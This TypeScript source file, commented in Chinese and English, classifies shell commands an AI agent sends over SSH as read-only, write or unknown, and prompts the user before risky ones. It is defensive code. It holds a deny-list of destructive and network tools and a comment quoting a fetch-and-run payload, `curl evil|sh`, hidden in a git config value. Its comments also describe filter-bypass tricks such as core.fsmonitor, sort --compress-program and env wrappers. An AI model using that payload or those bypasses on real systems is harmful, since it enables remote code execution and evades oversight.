import { ipcMain, BrowserWindow } from 'electron'
import { randomUUID } from 'crypto'
import { IPC } from '../../../src/shared/ipc-types'
import { getSshConnection, getSettings } from './store'

/**
 * Safety gate for agent-driven SSH command execution. Two policies:
 *
 *  • sshReadonlyNoConfirm = true (default): classify each command. READ-ONLY
 *    commands (ls/cat/grep/…) run with NO popup; WRITE/dangerous commands (rm/mv/
 *    redirects/installs/…) are confirmed EACH time. This is per-command — a later
 *    write still prompts even after earlier commands ran.
 *  • sshReadonlyNoConfirm = false: legacy "trust on first use, per connection" —
 *    the first command on a connection confirms, then that connection is trusted
 *    for the rest of this app run.
 *
 * Per-connection `autoConfirm` (in the SSH connection config) overrides both and
 * never prompts. Restarting the app clears the trust set.
 */

const trusted = new Set<string>()

// ── 命令风险判定 ────────────────────────────────────────────────────────────
// 三态判决：'read' 确定只读 / 'write' 确定（或极可能）有写副作用 / 'unknown' 解析不了。
// 'write' 与 'unknown' 目前都会弹确认框，但类型分开是将来任何自动放行策略的前提：
// "我看懂了，是写" 和 "我根本没看懂" 是两件事，不能压成同一个 false。
//
// 判定原则：默认按写处理，只有认得出来的只读形态才放行；
// 判定按**参数**而不是按程序名——同一个程序换个开关就能执行任意代码
// （git config 的 core.fsmonitor / sort 的 --compress-program / find 的 -exec …）。

/** 命令判决三态。 */
export type CommandVerdict = 'read' | 'write' | 'unknown'

/** 判决 + 中文原因（原因会进日志，方便排查为什么弹了框）。 */
export interface CommandRisk {
  verdict: CommandVerdict
  reason: string
}

const read = (reason: string): CommandRisk => ({ verdict: 'read', reason })
const write = (reason: string): CommandRisk => ({ verdict: 'write', reason })
const unknown = (reason: string): CommandRisk => ({ verdict: 'unknown', reason })

/** Pure read-only binaries (no write side effects when used normally). */
const READ_BINS = new Set([
  'ls', 'll', 'dir', 'cat', 'tac', 'nl', 'head', 'tail', 'less', 'more', 'grep', 'egrep', 'fgrep', 'zgrep', 'zcat',
  'find', 'locate', 'which', 'whereis', 'type', 'command', 'stat', 'file', 'wc', 'du', 'df', 'tree', 'readlink',
  'realpath', 'dirname', 'basename', 'pwd', 'cd', 'echo', 'printf', 'date', 'cal', 'uptime', 'whoami', 'id',
  'hostname', 'uname', 'hostnamectl', 'arch', 'nproc', 'free', 'vmstat', 'iostat', 'ps', 'pgrep', 'pstree',
  'printenv', 'history', 'lsof', 'netstat', 'ss', 'ip', 'ifconfig', 'route', 'arp', 'dig', 'nslookup',
  'host', 'getent', 'cut', 'sort', 'uniq', 'tr', 'column', 'fold', 'fmt', 'xxd', 'hexdump', 'od', 'strings',
  'sha256sum', 'sha1sum', 'md5sum', 'cksum', 'cmp', 'diff', 'comm', 'jq', 'yq', 'sed', 'awk', 'true', 'test',
  'lscpu', 'lsblk', 'lsusb', 'lspci', 'mount', 'who', 'w', 'last', 'groups', 'tty', 'stty', 'seq', 'expr',
])
// 注：`env` 不在表里 —— 它是包装器（`env -i /tmp/x.sh` 能执行任意程序），单独按参数判。

/** Binaries that are read-only ONLY for specific subcommands (else assume write). */
const SUBCMD_READ: Record<string, Set<string>> = {
  // git 的 config 子命令**不在**这里：它按参数单独判（见 classifyGit）。
  git: new Set(['status', 'log', 'diff', 'show', 'branch', 'remote', 'rev-parse', 'describe', 'ls-files', 'blame', 'cat-file', 'tag', 'shortlog', 'reflog', 'whatchanged', 'grep', 'count-objects', 'ls-remote']),
  docker: new Set(['ps', 'images', 'image', 'logs', 'inspect', 'version', 'info', 'stats', 'top', 'port', 'history', 'search', 'system']),
  systemctl: new Set(['status', 'list-units', 'list-unit-files', 'list-timers', 'is-active', 'is-enabled', 'is-failed', 'show', 'cat', 'show-environment', 'get-default']),
  npm: new Set(['ls', 'list', 'view', 'outdated', 'audit', 'ping', 'root', 'prefix', 'config', 'doctor', 'why', 'search', 'fund']),
  yarn: new Set(['list', 'info', 'why', 'outdated', 'audit']),
  pnpm: new Set(['ls', 'list', 'outdated', 'audit', 'why']),
  kubectl: new Set(['get', 'describe', 'logs', 'top', 'version', 'explain', 'api-resources', 'api-versions', 'config', 'cluster-info', 'auth']),
  pip: new Set(['list', 'show', 'freeze', 'check', 'search']),
  pip3: new Set(['list', 'show', 'freeze', 'check', 'search']),
  apt: new Set(['list', 'show', 'search', 'policy']),
  brew: new Set(['list', 'info', 'search', 'outdated', 'deps']),
}

/** Tokens that make a command WRITE/dangerous wherever they appear. */
const DANGEROUS = /\b(rm|rmdir|unlink|mv|cp|rsync|scp|dd|mkfs|fdisk|parted|shred|truncate|chmod|chown|chgrp|setfacl|ln|touch|mkdir|tee|sponge|kill|pkill|killall|reboot|shutdown|halt|poweroff|init|crontab|at|useradd|userdel|usermod|groupadd|groupdel|passwd|chpasswd|swapon|swapoff|iptables|nft|ufw|firewall-cmd|setenforce|modprobe|insmod|rmmod|wget|curl)\b/

/** shell 解释器：它会去跑一段我们没解析的脚本文本，一律判不了。 */
const SHELL_BINS = new Set(['bash', 'sh', 'zsh', 'dash', 'ksh', 'ash', 'fish', 'csh', 'tcsh', 'busybox', 'xonsh', 'pwsh', 'powershell', 'cmd'])

/** 包装器剥离轮数上限：交替剥 wrapper 与透明前缀，超了就判不了（防死循环 + 防层层套壳绕过）。 */
const MAX_PEEL_ROUNDS = 8

// ── 词法分析 ────────────────────────────────────────────────────────────────

interface Word {
  text: string
  /** 该词是否来自引号内（引号内的 `>`/`|` 不是操作符）。 */
  quoted: boolean
}

interface ParsedCommand {
  /** 按 `;` `&&` `||` `|` `&` 换行 切分后的各段。 */
  segments: Word[][]
  /** 是否出现了写文件的重定向（`>` `>>` `2>` `&>`，不含 `2>&1` 这类 fd 复制）。 */
  redirectsToFile: boolean
}

/**
 * 手写词法分析：认引号、认转义、认重定向与分隔符。
 * 只要出现命令替换 `$(` / 反引号、进程替换 `<(` `>(`、子 shell `(`、heredoc `<<`、
 * 引号未闭合，就直接 fail —— 这些形态下我们的判定没有意义，必须交给用户确认。
 */
function parseCommand(src: string): ParsedCommand | { fail: string } {
  const segments: Word[][] = []
  let words: Word[] = []
  let cur = ''
  let curQuoted = false
  let hasCur = false
  let redirectsToFile = false

  const pushWord = (): void => {
    if (!hasCur) return
    words.push({ text: cur, quoted: curQuoted })
    cur = ''
    curQuoted = false
    hasCur = false
  }
  const pushSegment = (): void => {
    pushWord()
    if (words.length) segments.push(words)
    words = []
  }

  for (let i = 0; i < src.length; i++) {
    const ch = src[i]

    if (ch === '\\') {
      const next = src[i + 1]
      if (next === undefined) return { fail: '命令以反斜杠结尾，解析不了' }
      if (next !== '\n') { cur += next; hasCur = true }
      i++
      continue
    }

    if (ch === "'") {
      const end = src.indexOf("'", i + 1)
      if (end < 0) return { fail: '单引号未闭合，解析不了' }
      cur += src.slice(i + 1, end)
      hasCur = true
      curQuoted = true
      i = end
      continue
    }

    if (ch === '"') {
      let j = i + 1
      let buf = ''
      while (j < src.length && src[j] !== '"') {
        if (src[j] === '\\') { buf += src[j + 1] ?? ''; j += 2; continue }
        if (src[j] === '`') return { fail: '出现命令替换（反引号），解析不了' }
        if (src[j] === '$' && src[j + 1] === '(') return { fail: '出现命令替换 $( )，解析不了' }
        buf += src[j]
        j++
      }
      if (j >= src.length) return { fail: '双引号未闭合，解析不了' }
      cur += buf
      hasCur = true
      curQuoted = true
      i = j
      continue
    }

    if (ch === '`') return { fail: '出现命令替换（反引号），解析不了' }
    if (ch === '$' && src[i + 1] === '(') return { fail: '出现命令替换 $( )，解析不了' }
    if ((ch === '<' || ch === '>') && src[i + 1] === '(') return { fail: '出现进程替换 <( ) / >( )，解析不了' }
    if (ch === '(' || ch === ')') return { fail: '出现子 shell 括号，解析不了' }

    if (ch === '>') {
      // 前面紧贴的纯数字是 fd 号（`2>`），不是一个词。
      if (hasCur && !curQuoted && /^\d+$/.test(cur)) { cur = ''; hasCur = false }
      pushWord()
      let j = i + 1
      if (src[j] === '>') j++
      let k = j
      while (src[k] === ' ' || src[k] === '\t') k++
      if (src[k] === '&') {
        const after = src[k + 1]
        // `2>&1` / `>&-` 是复制/关闭 fd，不写文件；`>&file` 才是写文件。
        if (after !== undefined && /[\d-]/.test(after)) { i = k; continue }
        redirectsToFile = true
        i = k
        continue
      }
      redirectsToFile = true
      i = j - 1
      continue
    }

    if (ch === '<') {
      if (src[i + 1] === '<' && src[i + 2] !== '<') return { fail: '出现 heredoc，解析不了' }
      if (hasCur && !curQuoted && /^\d+$/.test(cur)) { cur = ''; hasCur = false }
      pushWord()
      if (src[i + 1] === '<') i += 2 // `<<<` 此串重定向：只是喂 stdin
      continue
    }

    if (ch === '&') {
      pushWord()
      if (src[i + 1] === '>') {
        redirectsToFile = true
        i++
        if (src[i + 1] === '>') i++
        continue
      }
      if (src[i + 1] === '&') i++
      pushSegment()
      continue
    }

    if (ch === '|') {
      pushWord()
      if (src[i + 1] === '|' || src[i + 1] === '&') i++
      pushSegment()
      continue
    }

    if (ch === ';' || ch === '\n' || ch === '\r') { pushSegment(); continue }
    if (ch === ' ' || ch === '\t') { pushWord(); continue }

    cur += ch
    hasCur = true
  }
  pushSegment()
  return { segments, redirectsToFile }
}

// ── 通用小工具 ──────────────────────────────────────────────────────────────

/** 取程序名：去路径、去 .exe、转小写。 */
function binName(raw: string): string {
  const base = raw.split(/[\\/]/).pop() || raw
  return base.toLowerCase().replace(/\.exe$/, '')
}

/**
 * 长选项可以写缩写：`--compress-program` 写成 `--comp` 也生效。
 * minLen = 与兄弟选项区分开所需的最短前缀长度（含 `--`）。
 */
function isLongPrefixOf(flag: string, full: string, minLen: number): boolean {
  return flag.startsWith('--') && flag.length >= minLen && full.startsWith(flag)
}

/** `--foo=bar` 取 `--foo`。 */
function flagName(token: string): string {
  const eq = token.indexOf('=')
  return eq < 0 ? token : token.slice(0, eq)
}

/** 跳过开头的 `FOO=bar` 形式环境变量赋值。 */
function stripAssignments(words: Word[]): Word[] {
  let i = 0
  while (i < words.length && !words[i].quoted && /^[A-Za-z_][A-Za-z0-9_]*=/.test(words[i].text)) i++
  return i ? words.slice(i) : words
}

// ── 包装器剥离 ──────────────────────────────────────────────────────────────

/** 包装器选项表：value = 需要吃掉一个值的选项，flag = 不带值的开关。 */
interface WrapperSpec {
  value: Set<string>
  flag: Set<string>
  /** 命令前还有几个位置参数（timeout 的时长），以及它长什么样。 */
  positional?: RegExp
}

const WRAPPER_SPECS: Record<string, WrapperSpec> = {
  timeout: {
    value: new Set(['-s', '--signal', '-k', '--kill-after']),
    flag: new Set(['--preserve-status', '--foreground', '-v', '--verbose']),
    positional: /^\d+(\.\d+)?[smhd]?$/,
  },
  nice: { value: new Set(['-n', '--adjustment']), flag: new Set() },
  nohup: { value: new Set(), flag: new Set() },
  stdbuf: { value: new Set(['-i', '--input', '-o', '--output', '-e', '--error']), flag: new Set() },
  ionice: {
    value: new Set(['-c', '--class', '-n', '--classdata', '-p', '--pid', '-P', '--pgid', '-u', '--uid']),
    flag: new Set(['-t', '--ignore']),
  },
  // sudo 一直被当作透明前缀（历史行为）：只剥壳，不因为提权本身改判。
  sudo: {
    value: new Set(['-u', '--user', '-g', '--group', '-p', '--prompt', '-C', '--close-from', '-h', '--host', '-U', '--other-user', '-T', '--command-timeout', '-r', '--role', '-t', '--type']),
    flag: new Set(['-E', '--preserve-env', '-H', '--set-home', '-n', '--non-interactive', '-k', '--reset-timestamp', '-A', '--askpass', '-b', '--background', '-S', '--stdin']),
  },
  doas: { value: new Set(['-u', '-C', '-a']), flag: new Set(['-n', '-s', '-L']) },
}

type PeelResult =
  | { kind: 'words'; words: Word[] }
  | { kind: 'verdict'; risk: CommandRisk }
  | null

/** 剥一层包装器；返回 null 表示这个程序不是包装器。 */
function peelWrapper(bin: string, words: Word[]): PeelResult {
  // env：报告要求「后面出现任何 `-` 开头选项一律判写」——`env -i` / `env -u` /
  // `env -S` 都能改写将要执行的程序与环境，我们不去精细建模它的 arity。
  if (bin === 'env') {
    let i = 1
    while (i < words.length) {
      const t = words[i].text
      if (t.startsWith('-') && t !== '-') return { kind: 'verdict', risk: write(`env 带选项 ${t}，可改写执行环境`) }
      if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(t)) { i++; continue }
      break
    }
    const rest = words.slice(i)
    if (!rest.length) return { kind: 'verdict', risk: read('env 仅打印环境变量') }
    return { kind: 'words', words: rest }
  }

  // shell 透明前缀：exec / command / builtin。
  if (bin === 'exec' || bin === 'command' || bin === 'builtin') {
    let i = 1
    while (i < words.length) {
      const t = words[i].text
      if (t === '--') { i++; break }
      if (!t.startsWith('-') || t === '-') break
      if (bin === 'command' && (t === '-v' || t === '-V')) return { kind: 'verdict', risk: read('command -v 只查询命令位置') }
      if (bin === 'command' && t === '-p') { i++; continue }
      if (bin === 'exec' && (t === '-c' || t === '-l')) { i++; continue }
      if (bin === 'exec' && t === '-a') { i += 2; continue }
      return { kind: 'verdict', risk: unknown(`${bin} 的选项 ${t} 无法解析`) }
    }
    const rest = words.slice(i)
    if (!rest.length) return { kind: 'verdict', risk: read(`${bin} 未带任何命令`) }
    return { kind: 'words', words: rest }
  }

  const spec = WRAPPER_SPECS[bin]
  if (!spec) return null

  let i = 1
  while (i < words.length) {
    const t = words[i].text
    if (t === '--') { i++; break }
    if (!t.startsWith('-') || t === '-') break
    if (t.includes('=')) {
      const name = flagName(t)
      if (spec.value.has(name) || spec.flag.has(name)) { i++; continue }
      return { kind: 'verdict', risk: unknown(`${bin} 的选项 ${t} 无法解析`) }
    }
    if (spec.flag.has(t)) { i++; continue }
    if (spec.value.has(t)) { i += 2; continue }
    if (bin === 'nice' && /^[-+]\d+$/.test(t)) { i++; continue } // nice -10
    if (!t.startsWith('--') && t.length > 2 && spec.value.has(t.slice(0, 2))) { i++; continue } // stdbuf -oL
    return { kind: 'verdict', risk: unknown(`${bin} 的选项 ${t} 无法解析`) }
  }
  if (spec.positional) {
    if (i < words.length && spec.positional.test(words[i].text)) i++
    else return { kind: 'verdict', risk: unknown(`${bin} 的参数形态无法解析`) }
  }
  const rest = words.slice(i)
  if (!rest.length) return { kind: 'verdict', risk: unknown(`${bin} 后面没有可判定的命令`) }
  return { kind: 'words', words: rest }
}

// ── 按参数判定的程序 ────────────────────────────────────────────────────────

/** git config 明确的读取选项；只有带这些才算只读。 */
const GIT_CONFIG_READ_FLAGS = new Set(['--get', '--get-all', '--get-regexp', '--get-urlmatch', '--list', '-l'])

/** git 子命令之前出现即判写的全局选项：它们能改写 git 将要执行的外部程序。 */
function isGitExecRiskGlobal(token: string): boolean {
  const name = flagName(token)
  if (token === '-c' || (token.startsWith('-c') && !token.startsWith('--') && token.length > 2)) return true
  if (name === '--config-env' || isLongPrefixOf(name, '--config-env', 4)) return true
  if (name === '--git-dir' || isLongPrefixOf(name, '--git-dir', 4)) return true
  if (name === '--work-tree' || isLongPrefixOf(name, '--work-tree', 4)) return true
  if (name === '--exec-path' || isLongPrefixOf(name, '--exec-path', 7)) return true
  return false
}

/** git 里带值、但本身不改执行出口的全局选项（跳过它和它的值）。 */
const GIT_GLOBAL_VALUE_FLAGS = new Set(['-C', '--namespace', '--super-prefix', '--attr-source', '--list-cmds'])
const GIT_GLOBAL_BOOL_FLAGS = new Set([
  '-p', '-P', '--paginate', '--no-pager', '--bare', '--no-replace-objects', '--literal-pathspecs',
  '--glob-pathspecs', '--noglob-pathspecs', '--icase-pathspecs', '--html-path', '--man-path', '--info-path',
  '--version', '--help', '--no-optional-locks', '--no-lazy-fetch', '--no-advice',
])

function classifyGit(words: Word[]): CommandRisk {
  let i = 1
  while (i < words.length) {
    const t = words[i].text
    if (t === '--') { i++; break }
    if (!t.startsWith('-') || t === '-') break
    // 先判「改执行出口」的那批 —— 命中即写，别再往下解析。
    if (isGitExecRiskGlobal(t)) return write(`git 全局选项 ${t} 能改写 git 调用的外部程序`)
    if (t.startsWith('-C') && !t.startsWith('--') && t.length > 2) { i++; continue } // -C/path 只改 cwd
    const name = flagName(t)
    if (GIT_GLOBAL_BOOL_FLAGS.has(name)) { i++; continue }
    if (GIT_GLOBAL_VALUE_FLAGS.has(name)) { i += t.includes('=') ? 1 : 2; continue }
    return unknown(`git 全局选项 ${t} 无法解析`)
  }
  const sub = (words[i]?.text || '').toLowerCase()
  if (!sub) return read('git 未带子命令')

  if (sub === 'config') {
    // `git config core.fsmonitor '!任意命令'` 之后随便一条 git status 就会引爆，
    // 所以 config 只有带明确读取选项才算只读，其余（含赋值、--edit、--unset）一律写。
    const hasRead = words.slice(i + 1).some(w => GIT_CONFIG_READ_FLAGS.has(flagName(w.text)))
    return hasRead ? read('git config 仅读取配置') : write('git config 未带读取选项，按写配置处理')
  }
  const set = SUBCMD_READ.git
  return set.has(sub) ? read(`git ${sub} 只读`) : write(`git ${sub} 不在只读子命令表内`)
}

function classifySort(words: Word[]): CommandRisk {
  for (let i = 1; i < words.length; i++) {
    const t = words[i].text
    if (t === '--') break
    const name = flagName(t)
    // --compress-program 会拿用户给的程序去跑；-o 直接写文件。
    if (name === '--compress-program' || isLongPrefixOf(name, '--compress-program', 4)) {
      return write('sort --compress-program 会执行外部程序')
    }
    if (name === '-o' || name === '--output' || isLongPrefixOf(name, '--output', 4)) return write('sort -o 会写文件')
    if (!t.startsWith('--') && t.startsWith('-') && t.length > 2 && t[1] === 'o') return write('sort -o 会写文件')
  }
  return read('sort 只读')
}

/** find 里能执行程序或写文件的谓词。 */
const FIND_WRITE_PREDICATES = new Set(['-delete', '-exec', '-execdir', '-ok', '-okdir', '-fprintf', '-fprint', '-fprint0', '-fls'])

function classifyFind(words: Word[]): CommandRisk {
  for (let i = 1; i < words.length; i++) {
    const t = words[i].text
    if (FIND_WRITE_PREDICATES.has(t)) return write(`find ${t} 会删文件或执行程序`)
  }
  return read('find 只读')
}

function classifyInPlaceEditor(bin: string, words: Word[]): CommandRisk {
  for (let i = 1; i < words.length; i++) {
    const w = words[i]
    if (w.quoted) continue // 引号里的是脚本正文，不是选项
    const t = w.text
    if (t === '--') break
    if (t === '--in-place' || t.startsWith('--in-place=')) return write(`${bin} --in-place 原地改文件`)
    // -i / -i.bak / 组合短选项 -ni，都是原地编辑
    if (t.startsWith('-') && !t.startsWith('--') && /^-[A-Za-z]*i/.test(t)) return write(`${bin} ${t} 原地改文件`)
  }
  return read(`${bin} 只输出到 stdout`)
}

function classifyAwk(bin: string, words: Word[]): CommandRisk {
  for (let i = 1; i < words.length; i++) {
    const t = words[i].text
    // awk 程序正文里可以起子进程或写文件：system("…") / print | "sh" / print > "file"
    if (/system\s*\(/.test(t) || /\|\s*"/.test(t) || />\s*"/.test(t)) {
      return write(`${bin} 程序正文里会起子进程或写文件`)
    }
  }
  return read(`${bin} 只读`)
}

/** ip 的写动作（`ip route add …` 改路由表）。 */
const IP_WRITE_VERBS = new Set(['add', 'del', 'delete', 'set', 'change', 'replace', 'flush', 'append', 'up', 'down'])

function classifyIp(words: Word[]): CommandRisk {
  for (let i = 1; i < words.length; i++) {
    if (IP_WRITE_VERBS.has(words[i].text.toLowerCase())) return write(`ip ${words[i].text} 会改网络配置`)
  }
  return read('ip 只读')
}

// ── 段判定 ──────────────────────────────────────────────────────────────────

function classifySegment(rawWords: Word[]): CommandRisk {
  let words = rawWords
  let rounds = 0
  for (;;) {
    words = stripAssignments(words)
    if (!words.length) return read('仅设置环境变量，没有实际命令')
    const bin = binName(words[0].text)
    const peel = peelWrapper(bin, words)
    if (!peel) break
    if (peel.kind === 'verdict') return peel.risk
    if (rounds >= MAX_PEEL_ROUNDS) return unknown(`包装器嵌套超过 ${MAX_PEEL_ROUNDS} 层，无法判定`)
    rounds++
    words = peel.words
  }

  const bin = binName(words[0].text)
  if (!bin || bin === 'cd') return read('切换目录')
  if (SHELL_BINS.has(bin)) return unknown(`调用了 ${bin}，其内部命令未解析`)

  switch (bin) {
    case 'git': return classifyGit(words)
    case 'sort': return classifySort(words)
    case 'find': return classifyFind(words)
    // perl/ruby/python 不在这里：它们本来就不在只读表里（能跑任意脚本），
    // 走默认分支判写即可，绝不能因为「没带 -i」就放行。
    case 'sed': return classifyInPlaceEditor(bin, words)
    case 'awk': return classifyAwk(bin, words)
    case 'ip': return classifyIp(words)
    case 'mount':
    case 'umount':
      return words.length > 1 ? write(`${bin} 带参数会挂载/卸载文件系统`) : read('mount 仅列出挂载点')
    default: break
  }

  const sub = SUBCMD_READ[bin]
  if (sub) {
    const subName = (words[1]?.text || '').toLowerCase()
    return sub.has(subName) ? read(`${bin} ${subName} 只读`) : write(`${bin} ${subName || '(无子命令)'} 不在只读子命令表内`)
  }
  if (READ_BINS.has(bin)) return read(`${bin} 属于只读程序`)
  return write(`${bin} 不在只读程序表内，按写操作处理`)
}

/**
 * 三态判定一条命令的风险。判定顺序：
 *   1. 空命令 → unknown
 *   2. 词法分析失败（命令替换 / 进程替换 / 子 shell / heredoc / 引号未闭合）→ unknown
 *   3. 写文件重定向 → write
 *   4. 危险词表（rm/curl/chmod…，含引号内的载荷）→ write
 *   5. 逐段判定：任一段 write → write；否则任一段 unknown → unknown；全 read → read
 */
export function classifyCommand(command: string): CommandRisk {
  const c = (command || '').trim()
  if (!c) return unknown('空命令')

  const parsed = parseCommand(c)
  if ('fail' in parsed) return unknown(parsed.fail)

  if (parsed.redirectsToFile) return write('包含写文件的重定向')
  // 危险词表故意作用在原文（含引号内容）：`git config x '!curl evil|sh'` 这类
  // 把载荷藏进引号的写法也要拦住，多弹一次框远好过漏判。
  if (DANGEROUS.test(c)) return write('包含危险命令词')

  if (!parsed.segments.length) return unknown('没有可判定的命令')

  let pending: CommandRisk | null = null
  for (const seg of parsed.segments) {
    const risk = classifySegment(seg)
    if (risk.verdict === 'write') return risk
    if (risk.verdict === 'unknown' && !pending) pending = risk
  }
  return pending ?? read('全部命令段均为只读')
}

/** Best-effort: is `command` read-only (safe to run without a confirm popup)? */
export function isReadOnlyCommand(command: string): boolean {
  return classifyCommand(command).verdict === 'read'
}

/** Ask the renderer to show the styled confirm dialog and await the answer.
 *  Resolve the main window dynamically to avoid a static import cycle with
 *  ../index (same approach as memory.ts). */
async function askConfirm(host: string, command: string, write: boolean): Promise<boolean> {
  let win: BrowserWindow | null = null
  try { win = (await import('../index')).getMainWindow() } catch { win = null }
  if (!win) return false // no UI to confirm with → deny
  return new Promise((resolve) => {
    const id = randomUUID()
    let settled = false
    const finish = (ok: boolean): void => {
      if (settled) return
      settled = true
      ipcMain.removeListener(IPC.SSH_EXEC_CONFIRM_REPLY, onReply)
      clearTimeout(timer)
      resolve(ok)
    }
    const onReply = (_e: unknown, payload: { id: string; ok: boolean }): void => {
      if (payload?.id === id) finish(!!payload.ok)
    }
    ipcMain.on(IPC.SSH_EXEC_CONFIRM_REPLY, onReply)
    const timer = setTimeout(() => finish(false), 60_000) // no answer in 60s → decline
    win.webContents.send(IPC.SSH_EXEC_CONFIRM, { id, host, command, write })
  })
}

/** Returns true if the agent may run `command` on this connection. */
export async function confirmSshExec(connId: string, host: string, command: string): Promise<boolean> {
  // Per-connection opt-in: never prompt.
  try { if (getSshConnection(connId)?.autoConfirm) return true } catch { /* fall through */ }

  let readonlyMode = true
  try { readonlyMode = getSettings().sshReadonlyNoConfirm !== false } catch { /* default on */ }

  if (readonlyMode) {
    // 只读 → 不弹；写/判不了 → 每次都确认（不缓存信任）。
    // 注意：'unknown' 与 'write' 现在都弹框，但判决类型是分开的，
    // 将来要做自动放行策略时只能放行 'read'，绝不能把 'unknown' 混进去。
    const risk = classifyCommand(command)
    if (risk.verdict === 'read') return true
    return askConfirm(host, command, true)
  }

  // Legacy: trust on first use, per connection.
  if (trusted.has(connId)) return true
  const ok = await askConfirm(host, command, false)
  if (ok) trusted.add(connId)
  return ok
}

/** Drop trust for a connection (e.g. when it's deleted/edited). */
export function revokeSshTrust(connId: string): void {
  trusted.delete(connId)
}
